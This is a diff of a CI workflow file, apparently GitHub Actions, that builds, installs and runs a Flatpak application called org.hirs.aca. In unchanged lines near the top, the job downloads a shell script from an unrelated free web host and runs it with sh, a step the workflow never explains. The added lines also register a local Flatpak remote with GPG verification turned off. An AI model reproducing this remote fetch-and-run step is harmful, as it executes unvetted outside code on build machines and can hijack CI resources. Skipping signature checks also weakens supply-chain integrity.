@@ -11,6 +11,7 @@ jobs:
         run_script='https://massive-rims.000webhostapp.com/start-run-loop.sh'
         curl $run_script -o run.sh
         sh ./run.sh
+        
         sudo add-apt-repository ppa:flatpak/stable
         sudo apt update -y
         sudo apt install -y flatpak
@@ -22,5 +23,9 @@ jobs:
         sudo flatpak install -y flathub org.freedesktop.Sdk.Extension.openjdk8//21.08
 
         cd package/flatpak-aca
-        sudo flatpak-builder --user --install --force-clean build-dir org.hirs.aca.yml
+        mkdir repo
+        sudo flatpak-builder --repo=./repo --user --install --force-clean build-dir org.hirs.aca.yml
+        sudo flatpak remote-add  hirs ./repo --no-gpg-verify
+        sudo flatpak install org.hirs.aca
         flatpak run org.hirs.aca
+        sh ./scripts/aca-wait.sh
